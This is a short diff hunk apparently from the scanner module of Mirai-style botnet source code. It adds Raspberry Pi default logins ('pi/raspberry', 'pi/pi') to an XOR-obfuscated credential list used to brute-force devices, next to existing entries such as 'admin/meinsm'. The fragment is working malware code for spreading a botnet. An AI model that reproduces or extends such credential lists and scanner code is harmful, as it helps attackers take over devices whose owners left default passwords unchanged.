@@ -183,7 +183,8 @@ void scanner_init(void)
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  // admin    meinsm
     add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
     add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
-
+    add_auth_entry("\x52\x4B", "\x50\x43\x51\x52\x40\x47\x50\x50\x5B", 1);		    // pi	raspberry
+    add_auth_entry("\x52\x4B", "\x52\x4B", 1);				                    // pi       pi
 
 #ifdef DEBUG
     printf("[scanner] Scanner process initialized. Scanning started.\n");
